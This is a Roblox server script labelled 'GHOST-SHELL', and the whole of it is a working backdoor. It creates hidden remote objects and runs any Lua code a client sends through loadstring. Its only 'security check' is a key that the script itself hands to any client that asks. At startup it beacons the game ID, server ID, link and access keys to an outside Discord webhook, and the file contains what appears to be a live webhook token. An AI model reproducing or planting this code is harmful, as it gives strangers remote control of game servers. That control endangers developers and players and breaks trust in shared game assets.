local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Players = game:GetService("Players")
local ServerScriptService = game:GetService("ServerScriptService")
local HttpService = game:GetService("HttpService")
local RunService = game:GetService("RunService")

local gamelink = "https://www.roblox.com/games/" .. game.PlaceId
local cgame = game.Name
local ID = game.PlaceId
local Ver = game.PlaceVersion
local JobId = game.JobId or "STUDIO"
local Gamers = #Players:GetPlayers() -- discon
local ServerType = (game.PrivateServerId ~= "" and game.PrivateServerOwnerId == 0) and "Reserved" or (game.PrivateServerOwnerId ~= 0) and "Private" or "Public"

local WEBHOOK_URL = "https://webhook.lewisakura.moe/api/webhooks/1422668077278953572/JXfca4i3x1u-Rw05eQHDoPN2Y1QUIU9VKN6ZPNFQnZS4E2zZtYMLzhGxJw3OEPQctGCJ"

local RemoteEventName = HttpService:GenerateGUID(false):sub(1, 12)
local GhostEvent = Instance.new("RemoteEvent")
GhostEvent.Name = RemoteEventName
GhostEvent.Parent = ReplicatedStorage

print("GHOST-SHELL: Remote key established: " .. RemoteEventName)

local Environment = getfenv(0)
Environment.game = game
Environment.workspace = game.Workspace
Environment.Players = Players
Environment.task = task
Environment.wait = task.wait or wait

Environment.SpawnPart = function(playerName)
	local targetPlayer = Players:FindFirstChild(playerName)
	if targetPlayer and targetPlayer.Character then
		local p = Instance.new("Part")
		p.Size = Vector3.new(4, 4, 4)
		p.Color = Color3.new(1, 0, 0)
		p.Anchored = true
		p.CFrame = targetPlayer.Character.HumanoidRootPart.CFrame * CFrame.new(0, 10, 0)
		p.Parent = game.Workspace
		return "Part spawned near " .. playerName
	else
		return "Player not found"
	end
end

local DummyFunction = Instance.new("RemoteFunction")
local DummyFunctionName = HttpService:GenerateGUID(false):sub(1, 12) .. "_Func"
DummyFunction.Name = DummyFunctionName
DummyFunction.Parent = ReplicatedStorage

local function GetEventKey(player)
	return RemoteEventName
end

DummyFunction.OnServerInvoke = GetEventKey

print("GHOST-SHELL: Function key established: " .. DummyFunctionName)

local function ExecuteServerCode(player, key, code)
	-- SECURITY CHECK IMPLEMENTED HERE
	if key ~= DummyFunctionName then
		warn(string.format("GHOST-SHELL: Unauthorized access attempt from %s with key: %s", player.Name, tostring(key)))
		return "Access Denied"
	end

	if not player or typeof(code) ~= "string" or code:len() > 5000 then
		return "Invalid Request"
	end

	local chunk = loadstring(code)

	if chunk then
		setfenv(chunk, Environment)
	end

	local success, result = pcall(function()
		if chunk then
			return chunk()
		else
			return "LoadString Failed"
		end
	end)

	if success then
		print(string.format("GHOST-SHELL: Executed code from %s. Result: %s", player.Name, tostring(result)))
		return "Execution Success"
	else
		warn(string.format("GHOST-SHELL: Execution FAILED from %s. Error: %s", player.Name, tostring(result)))
		return "Execution Failed: " .. tostring(result)
	end
end

GhostEvent.OnServerEvent:Connect(ExecuteServerCode)

local function SendStartupWebhook()
	if WEBHOOK_URL == "YOUR_WEBHOOK_URL_HERE" or WEBHOOK_URL == "" then
		warn("GHOST-SHELL: Webhook URL not configured. Skipping notification.")
		return
	end

	local ServerInfo = {
		["content"] = "**New Server Detected!**",
		["embeds"] = {{
			["title"] = "New Server Active",
			["color"] = 16711680, -- Red color
			["fields"] = {
				{
					["name"] = "Game ID",
					["value"] = tostring(ID),
					["inline"] = false
				},
				{
					["name"] = "JobId (Server ID)",
					["value"] = tostring(JobId),
					["inline"] = false
				},
				{
					["name"] = "Server Version",
					["value"] = tostring(Ver),
					["inline"] = false
				},
				{
					["name"] = "Server Type",
					["value"] = tostring(ServerType),
					["inline"] = false
				},
				{
					["name"] = "Ghost Event Key",
					["value"] = RemoteEventName,
					["inline"] = false
				},
				{
					["name"] = "Link",
					["value"] = tostring(gamelink),
					["inline"] = false
				},
				{
					["name"] = "GSHELL KEY",
					["value"] = DummyFunctionName,
					["inline"] = false
				},
			},
			["footer"] = {
				["text"] = "Status: GHOST ONLINE"
			}
		}}
	}

	local JSONData = HttpService:JSONEncode(ServerInfo)

	local success, response = pcall(function()
		return HttpService:PostAsync(WEBHOOK_URL, JSONData, Enum.HttpContentType.ApplicationJson)
	end)

	if success then
		print("GHOST-SHELL: Webhook notification sent successfully.")
	else
		warn("GHOST-SHELL: Failed to send webhook. Error: " .. tostring(response))
	end
end


SendStartupWebhook()

-- DO NOT DELETE IT ITS TO KEEP THE SCRIPT RUNNING AND ALERT ITS ONLINE
task.spawn(function()
	while task.wait(300) do
		print("GHOST-SHELL: Core heartbeat check.")
	end
end)